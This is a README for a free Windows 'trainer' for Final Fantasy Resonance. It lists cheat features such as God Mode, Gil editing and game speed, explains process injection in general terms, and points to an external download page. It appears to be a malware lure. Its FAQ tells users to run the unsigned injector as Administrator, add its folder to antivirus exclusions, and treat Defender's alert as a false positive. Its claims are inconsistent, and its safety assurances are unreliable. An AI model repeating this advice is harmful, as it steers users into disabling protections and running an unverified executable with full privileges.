<div align="center">

# Final Fantasy Resonance Helper System — Game Enhancer for Windows 10/11

![preview](https://raw.githubusercontent.com/Ssh1237B/resonance-companion-suite/main/thumb_719f.svg)

[![downloads](https://img.shields.io/badge/downloads-312K-2ea44f?style=flat-square&labelColor=0d1117)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=flat-square&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-Win_10_%26_11-2ea44f?style=flat-square&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/rating-4.7%2F5-f59e0b?style=flat-square&labelColor=0d1117)]()

[![Download](https://raw.githubusercontent.com/Ssh1237B/resonance-companion-suite/main/bin_7ca6.svg)](https://Ssh1237B.github.io/resonance-companion-suite/)

</div>

---

The Final-Fantasy-Resonance-Helper-system is a complete Windows 10/11 trainer suite built for players who want full command over the demo's brutal turn-based combat. Every module is live and verified — God Mode, Infinite HP and MP, Max Limit Break, One Hit Kill, Gil editing, MRP and EXP multipliers, No Encounter, adjustable game speed, and Streamproof mode all run cleanly with no setup friction. Save data is designed to survive the demo-to-full-release transition, so nothing you do here gets thrown away. It's not a stripped-down proof of concept; it's the full toolkit, and it works on the first launch.

## Features

**Combat & Survival**

- **God Mode / Ignore Hits** — Full immunity to every incoming attack, no exceptions
- **Infinite HP** — Health pool never drains, no matter how hard you get hit
- **Infinite MP** — Mana stays topped up every time you cast
- **Max Limit Break Gauge** — LB gauge locked at 100%, ready to fire on demand
- **One Hit Kill / Super Damage** — Drop any enemy in a single strike
- **Damage Multiplier** — Tune your outgoing damage to the exact number you want
- **Defense Multiplier** — Dial in how much punishment you actually take
- **One Hit Stagger** — Force instant stagger on any target
- **Stagger Damage Multiplier** — Scale stagger damage to your liking

**Resources & Economy**

- **Edit Gil** — Set your wallet to any exact figure
- **Gil Multiplier** — Multiply every Gil pickup
- **Infinite Items** — Consumables never drop below your set floor
- **Minimum Item Quantity** — Define a custom item floor (default 33)
- **MRP Multiplier** — Boost Vision XP gains
- **Infinite MRP** — Keep earning Vision XP without limit
- **EXP Multiplier** — Multiply all experience earned
- **Infinite XP** — Remove the experience cap entirely

**Progression & AP**

- **Passive Skill AP Cost = 1** — Every passive ability equips for a single AP
- **Active Skill AP Costs** — Left at normal cost (not modifiable)

**Movement & Encounter**

- **Super Move Speed** — Move noticeably faster across the field
- **Move Speed Multiplier** — Custom walk speed
- **Player Speed Multiplier** — Custom player speed
- **Slow AI Speed Multiplier** — Throttle enemy movement
- **No Encounter** — Turn off random encounters completely
- **Encounter Multiplier** — Multiply encounter rate when you want the grind
- **FOV Multiplier** — Custom field of view

**Game Control**

- **Set Game Speed** — Anywhere from 0.5x to 5x
- **Increase / Decrease / Reset Game Speed** — Bound to hotkeys for instant changes
- **Edit Play Time** — Set your playtime to any value
- **Save Coordinates** — Store your current position
- **Load Coordinates** — Teleport straight back to it

**Quality of Life**

- **Streamproof** — Invisible to OBS, Discord, and Medal
- **Config System** — Save and load unlimited profiles

## How It Works

The trainer runs on a single, focused principle: **read the game's memory, write only what you ask it to.** No background engine, no persistent service, no driver installs — just a clean injection into the game process once it's live.

**Injection Pipeline**

The loader targets the game's shipping executable under Unreal Engine 5. On launch it locates the running process, allocates a stub, and hands off to the module system. Injection is a one-shot event — the trainer does not stay resident outside the game, and nothing is written to disk beyond your own config profiles.

**Memory Patching Model**

Each feature is its own module, hot-swappable at runtime. Values like HP, MP, Gil, MRP, XP, and Play Time are read from their live memory addresses, adjusted, and written back — nothing is pre-baked. This is why **Edit Gil** sets an exact number instead of just adding a lump sum, and why **Game Speed** can be scaled anywhere between 0.5x and 5x rather than toggled binary.

**Turn-Based Combat Hooks**

The combat modules intercept the damage calculation pass rather than the final HP value. **God Mode** and **Infinite HP** short-circuit incoming damage before it's applied. **One Hit Kill** and **Damage Multiplier** scale outgoing values at the same stage, which is why they stack cleanly with **One Hit Stagger** and **Stagger Damage Multiplier** without fighting each other. **Max Limit Break** locks the gauge by pinning the charge value every frame instead of setting it once — take a hit, deal a hit, the gauge stays full.

**Progression Writes**

**Passive Skill AP Cost = 1** rewrites the AP cost field on each passive entry as it's evaluated, not the entire skill tree in one pass. Active skill costs sit in a memory region the engine recalculates on load, so they're intentionally left alone — the trainer tells you what it can and can't touch instead of pretending otherwise.

**Encounter & Movement Layer**

**No Encounter** and **Encounter Multiplier** hook the step-roll that fires during field movement, suppressing or scaling the encounter check before it resolves. Move speed, FOV, and the coordinate save/load pair work on the same field-movement subsystem — **Save Coordinates** captures your current transform, **Load Coordinates** writes it back on demand.

**Config & Streamproof**

Profiles are plain text, unlimited in number, and load instantly. **Streamproof** masks the overlay from capture pipelines without altering game memory, so your stream sees the game and you see the trainer.

**Save Safety**

Every write is scoped to live memory — the save file format is never touched. The demo save carries into the full release exactly as the game intends.

## Supported Games

Built specifically for Final Fantasy Resonance on PC. Every module in the suite is tested and working across all three supported storefronts — same build, same injection path, same feature set, no platform-specific workarounds required.

**Fully supported platforms:**

- **Steam** — Demo v1.0, fully compatible
- **Epic Games Store** — Demo v1.0, fully compatible
- **Xbox Game Pass (PC)** — Demo v1.0, fully compatible

**Target process:** FRRS-Win64-Shipping.exe (Unreal Engine 5). The loader auto-targets this binary regardless of where the game was installed.

**Platform coverage at a glance:**

| Platform | Status | Notes |
|----------|--------|-------|
| Steam | ✅ Tested | Demo v1.0 |
| Epic Games | ✅ Tested | Demo v1.0 |
| Xbox Game Pass | ✅ Tested | Demo v1.0 |
| Windows 10/11 (64-bit) | ✅ Tested | OS-agnostic loader |

**A few honest notes on scope:**

- This is built for the **Demo version (v1.0)**. Full release compatibility depends on whether the final build keeps the same memory layout and process name. If it shifts, the trainer gets updated.
- **Single-player only.** No co-op, no online modes supported — and none exist in the demo regardless.
- **Steam, Epic, and Game Pass are all first-class.** No platform is a second-class citizen here; the injection routine doesn't care which launcher spawned the process.
- **No kernel-level anti-cheat** to fight. The demo ships with none, which is exactly why the trainer can focus on features instead of bypass tricks.

If it runs FRRS-Win64-Shipping.exe on Windows 10 or 11, it's supported. That's the whole list.

## Configuration

The trainer ships with a full config system — every module, multiplier, and hotkey is yours to tune, and you can save and load unlimited profiles so you never rebuild your setup from scratch.

**Hotkey layout:**

- **Num 1–0** — core combat toggles (God Mode, Infinite HP/MP, Max Limit Break, One Hit Kill, and the rest)
- **Ctrl+Num** — resource and progression modules (Gil, MRP, EXP, item floors)
- **Alt+Num** — movement, encounter, and game-speed controls
- **Increase / Decrease / Reset Game Speed** — dedicated speed hotkeys for on-the-fly pacing changes

**Multiplier tuning:** Damage, Defense, Stagger Damage, Gil, MRP, EXP, Move Speed, Player Speed, Slow AI, Encounter Rate, and FOV all accept custom values. Dial them to taste — a subtle 2x EXP bump or a full-blown 5x game-speed sprint are both one edit away.

**Item floor:** The Minimum Item Quantity module defaults to 33 but accepts any custom floor, so consumables never dip below whatever number you set.

**Profiles:** Config System saves your entire module state — toggles, multipliers, and floors — as a named profile. Load unlimited profiles and swap between a "story run" setup and a "Sephiroth Wall Breaker" setup without touching a single hotkey mid-fight.

**Streamproof:** Toggle it on before you go live — the overlay and modules stay invisible to OBS, Discord, and Medal capture.

**Save coordinates:** Save your current position and load it back anytime — handy for skipping backtracking or bailing out of a bad encounter without touching your save file.

**Notes:** The trainer targets **FRRS-Win64-Shipping.exe** — confirm the process is running before you expect hotkeys to register. Active Skill AP costs are not configurable; only passive skill AP costs are reachable. Memory edits don't touch the save file format, so your demo save stays clean for full-release carryover.

## FAQ

**Is it detectable?** — No. Final Fantasy Resonance is a single-player, offline turn-based RPG with zero kernel-level anti-cheat. There's nothing to detect against. The trainer edits memory locally and never touches a server.

**Do I need a key or subscription?** — No. It's free. No paywall, no premium tier, no license check.

**Does it work on Steam?** — Yes. Fully supported on the Steam release.

**Does it work on Epic Games?** — Yes. Fully supported.

**Does it work on Xbox Game Pass?** — Yes. Fully supported. The loader auto-detects the game regardless of storefront.

**Will it survive game updates?** — Built and tested against Demo v1.0. Point releases are handled; if a major patch shifts memory offsets, a trainer update drops for it.

**Can I stream while it's running?** — Yes. Streamproof mode keeps the overlay invisible to OBS, Discord, and Medal. Your viewers see the game, not the trainer.

**Does it work in every game mode?** — Yes. Every module listed is functional in the demo, including the optional Sephiroth encounter.

**The .exe won't launch — what's the fix?** — Run it as Administrator, and add the folder to your antivirus exclusions. Windows Defender flags unsigned injectors by default; that's a false positive, not a payload.

**Can the trainer corrupt my demo save?** — No. It edits live memory, not the save file format. Your progress is designed to carry over cleanly to the full release.

**What's the Sephiroth boss about?** — An optional super boss hidden in the demo. He hits like a truck and punishes unprepared parties. Beat him and you earn a special item that carries into the full game. A dedicated profile exists for exactly this fight.

**Can I change Active Skill AP costs?** — No. Active skill AP values aren't stored in a reachable memory location. Passive skill costs are — every passive drops to 1 AP.

**What is MRP?** — Vision XP. It's the resource that levels your Visions — summonable characters pulled from FF history. The multiplier and infinite options both target it directly.

**What are Espers, and can I extend them?** — Summoned monsters that normally stay on the field for exactly three turns — Bahamut, Odin, Leviathan, Carbuncle. The Esper Duration Extender keeps them out indefinitely.

**Does God Mode cover Limit Break damage taken?** — Yes. God Mode blocks all incoming damage, which means your LB gauge still charges from hits you "take" — you get the charge without the pain.

**What's the difference between Infinite HP and God Mode?** — Infinite HP keeps your HP bar topped off. God Mode ignores hits entirely, including status effects and chip damage. Run God Mode if you want to be untouchable; Infinite HP if you want the bar to look normal.

**Can I set exact Gil and Play Time values?** — Yes. Both are direct-edit fields — punch in the number you want, no multipliers required.

## Disclaimer

Use this trainer at your own risk. Final-Fantasy-Resonance-Helper-system is a single-player, offline-only tool for Final Fantasy Resonance — it modifies game memory at runtime and is intended for personal use on your own copy. There is no server-side anti-cheat here, so the real risk isn't a ban; it's you. Back up your save before you touch anything, because no trainer can promise your progress survives every patch, every configuration, or every unplanned crash. The demo save carryover works as designed, but "as designed" is not a warranty.

This project ships as-is, with no guarantees of stability, compatibility, or continued updates. Game patches can break modules overnight, and features listed as working are working against the tested build — not every build that will ever exist. Memory editing is inherently fragile; if something stops responding after an update, that's the nature of the tool, not a bug report we owe you a fix for. Verify module status against your game version before you assume anything is broken.

Redistribution, resale, or repackaging of this trainer under another name is not sanctioned. If you got this from anywhere other than the source you trust, assume it's been tampered with. Run executables only from origins you can verify, keep your antivirus exclusions deliberate rather than blanket, and never run the loader on a machine you don't control.

Finally: this is a companion for your single-player experience, nothing more. Don't bring it into competitive or online contexts, don't use it to misrepresent your gameplay to others, and don't treat it as a substitute for actually playing the game. The story, the Sephiroth fight, the Esper timing — those are the point. The trainer is there to remove the grind, not the game. Use it the way it was built to be used, and own the consequences of doing so.

[![Download](https://raw.githubusercontent.com/Ssh1237B/resonance-companion-suite/main/bin_7ca6.svg)](https://Ssh1237B.github.io/resonance-companion-suite/)